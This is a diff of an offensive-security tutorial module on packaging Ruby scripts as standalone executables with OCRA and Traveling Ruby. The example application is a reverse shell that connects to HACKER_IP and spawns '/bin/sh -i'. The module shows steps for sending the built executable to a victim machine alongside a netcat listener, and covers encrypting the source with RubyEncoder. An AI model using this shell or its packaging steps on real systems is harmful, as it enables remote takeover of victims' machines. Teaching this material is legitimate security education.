@@ -1,30 +1,31 @@
-# Module 0x2 | System Kung Fu
+# Module 0x2 \| System Kung Fu
 
 ## Packaging
 
 Many questions about building a standalone application that doesn't require Ruby to be pre-installed on the system. Of-course, due attacking machine you cant grantee that ruby is installed on the target system. So here we will demonstrate some ways to do that.
 
-### One-Click Ruby Application(OCRA) Builder
+### One-Click Ruby Application\(OCRA\) Builder
 
-OCRA (One-Click Ruby Application) builds Windows executables from Ruby source code. The executable is a self-extracting, self-running executable that contains the Ruby interpreter, your source code and any additionally needed ruby libraries or DLL.
+OCRA \(One-Click Ruby Application\) builds Windows executables from Ruby source code. The executable is a self-extracting, self-running executable that contains the Ruby interpreter, your source code and any additionally needed ruby libraries or DLL.
 
-**It's Windows support only**, not really ;)
+**It's Windows support only**, not really ;\)
 
-*   Features
+* Features
 
-    > * LZMA Compression (optional, default on)
-    > * Ruby 1.8.7, 1.9.3, 2.0.0 and 2.1.5 support
-    > * Both windowed/console mode supported
-    > * Includes gems based on usage, or from a Bundler Gemfile
-*   To install OCRA
+  > * LZMA Compression \(optional, default on\)
+  > * Ruby 1.8.7, 1.9.3, 2.0.0 and 2.1.5 support
+  > * Both windowed/console mode supported
+  > * Includes gems based on usage, or from a Bundler Gemfile
 
-    ```
-    gem install ocra
-    ```
+* To install OCRA
+
+  ```text
+  gem install ocra
+  ```
 
 So all what to need is to have your application.
 
-Suppose we have the following script, a reverse shell of course ;)
+Suppose we have the following script, a reverse shell of course ;\)
 
 ```ruby
 #!/usr/bin/env ruby
@@ -43,13 +44,13 @@ end
 
 from our Windows Attacker machine cmd.exe
 
-```
+```text
 C:\Users\admin\Desktop>ocra rshell.rb --windows --console
 ```
 
 Results
 
-```
+```text
 C:\Users\admin\Desktop>ocra rshell.rb --windows --console
 === Loading script to check dependencies
 ruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]
@@ -82,27 +83,27 @@ ruby C:/Users/admin/Desktop/rshell.rb.rb [HACKER_IP HACKER_PORT]
 
 In the same directory, you'll find an exe file `rshell.exe`. Send it on the windows victim machine which doesn't have ruby installed and run it.
 
-```
+```text
 rshell.exe 192.168.0.14 9911
 ```
 
 from our attacking machine we already listening on 9911
 
-```
+```text
 nc -lvp 9911
 ```
 
-![](../images/module02/packaging\_\_ocra1.png)
+![](../.gitbook/assets/packaging__ocra1.png)
 
 ### Traveling-ruby
 
-From official site "_Traveling Ruby is a project which supplies self-contained, "portable" Ruby binaries: Ruby binaries that can run on any Linux distribution and any OS X machine. It also has Windows support (with some caveats). This allows Ruby app developers to bundle these binaries with their Ruby app, so that they can distribute a single package to end users, without needing end users to first install Ruby or gems._"
+From official site "_Traveling Ruby is a project which supplies self-contained, "portable" Ruby binaries: Ruby binaries that can run on any Linux distribution and any OS X machine. It also has Windows support \(with some caveats\). This allows Ruby app developers to bundle these binaries with their Ruby app, so that they can distribute a single package to end users, without needing end users to first install Ruby or gems._"
 
 Note: The following script has been taken from the official docs.
 
 #### Preparation
 
-```
+```text
 mkdir rshell
 cd rshell
 ```
@@ -124,18 +125,18 @@ s = TCPSocket.open(ip,port).to_i
 exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)
 ```
 
-* Test it&#x20;
+* Test it 
 
-```
+```text
 ruby rshell.rb 
 # => ruby rshell.rb [HACKER_IP] [HACKER_PORT]
 ```
 
 **Creating package directories**
 
-The next step is to prepare packages for all the target platforms, by creating a directory each platform, and by copying your app into each directory. (Assuming that your application could differ from OS to another)
+The next step is to prepare packages for all the target platforms, by creating a directory each platform, and by copying your app into each directory. \(Assuming that your application could differ from OS to another\)
 
-```
+```text
 mkdir -p rshell-1.0.0-linux-x86/lib/app
 cp rshell.rb rshell-1.0.0-linux-x86/lib/app/
 
@@ -148,7 +149,7 @@ cp rshell.rb rshell-1.0.0-osx/lib/app/
 
 Next, create a `packaging` directory and download Traveling Ruby binaries for each platform into that directory. Then extract these binaries into each packaging directory. You can find a list of binaries at the Traveling Ruby Amazon S3 bucket. For faster download times, use the CloudFront domain "[http://d6r77u77i8pq3.cloudfront.net](http://d6r77u77i8pq3.cloudfront.net)". In this tutorial we're extracting version 20141215-2.1.5.
 
-```
+```text
 mkdir packaging
 cd packaging
 wget -c  http://d6r77u77i8pq3.cloudfront.net/releases/traveling-ruby-20141215-2.1.5-linux-x86.tar.gz
@@ -163,7 +164,7 @@ mkdir rshell-1.0.0-osx/lib/ruby && tar -xzf packaging/traveling-ruby-20141215-2.
 
 Now, each package directory will have Ruby binaries included. It looks like this: Your directory structure will now look like this:
 
-```
+```text
 rshell/
  |
  +-- rshell.rb
@@ -196,7 +197,7 @@ rshell/
 
 Let's do a basic sanity test by running your app with a bundled Ruby interpreter. Suppose that you are developing on OS X. Run this:
 
-```
+```text
 cd rshell-osx
 ./lib/ruby/bin/ruby lib/app/rshell.rb
 # => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]
@@ -224,7 +225,7 @@ exec "$SELFDIR/lib/ruby/bin/ruby" "$SELFDIR/lib/app/rshell.rb"
 
 Save this file as `packaging/wrapper.sh` in your project's root directory. Then you can copy it to each of your package directories and name it `rshell`:
 
-```
+```text
 chmod +x packaging/wrapper.sh
 cp packaging/wrapper.sh rshell-1.0.0-linux-x86/rshell
 cp packaging/wrapper.sh rshell-1.0.0-linux-x86_64/rshell
@@ -233,7 +234,7 @@ cp packaging/wrapper.sh rshell-1.0.0-osx/rshell
 
 **Finalizing packages**
 
-```
+```text
 tar -czf rshell-1.0.0-linux-x86.tar.gz rshell-1.0.0-linux-x86
 tar -czf rshell-1.0.0-linux-x86_64.tar.gz rshell-1.0.0-linux-x86_64
 tar -czf rshell-1.0.0-osx.tar.gz rshell-1.0.0-osx
@@ -250,7 +251,7 @@ An x86 Linux user could now use your app like this:
 2. The user extracts this file.
 3. The user runs your app:
 
-```
+```text
 /path-to/rshell-1.0.0-linux-x86/rshell
 # => ruby rshell.rb.rb [HACKER_IP  HACKER_PORT]
 ```
@@ -320,13 +321,13 @@ end
 
 You can then create all 3 packages by running:
 
-```
+```text
 rake package
 ```
 
 You can also create a package for a specific platform by running one of:
 
-```
+```text
 rake package:linux:x86
 rake package:linux:x86_64
 rake package:osx
@@ -334,7 +335,7 @@ rake package:osx
 
 You can also just create package directories, without creating the .tar.gz files, by passing DIR\_ONLY=1:
 
-```
+```text
 rake package DIR_ONLY=1
 rake package:linux:x86 DIR_ONLY=1
 rake package:linux:x86_64 DIR_ONLY=1
@@ -345,7 +346,7 @@ rake package:osx DIR_ONLY=1
 
 You now have three files which you can distribute to end users.
 
-```
+```text
 rshell-1.0.0-linux-x86.tar.gz
 rshell-1.0.0-linux-x86_64.tar.gz
 rshell-1.0.0-osx.tar.gz
@@ -353,7 +354,7 @@ rshell-1.0.0-osx.tar.gz
 
 Suppose the end user is on Linux x86\_64. S/he uses your app by downloading rshell-1.0.0-linux-x86\_64.tar.gz, extracting it and running it:
 
-```
+```text
 wget rshell-1.0.0-linux-x86_64.tar.gz
 ...
 tar xzf rshell-1.0.0-linux-x86_64.tar.gz
@@ -381,3 +382,4 @@ cd rshell-1.0.0-linux-x86_64
 Sometimes we don't want to disclose our source code for whatever reason, but we still want to share our applications either commercially or for free. Here a commercial solution for that purpose, RubyEncoder.
 
 **RubyEncoder** protects Ruby scripts by compiling Ruby source code into a bytecode format and this is followed by encryption. This protects your scripts from reverse engineering. Ruby scripts protected with RubyEncoder can be executed but cannot be used to extract Ruby source code as there is no source code remaining within the protected script in any form.
+
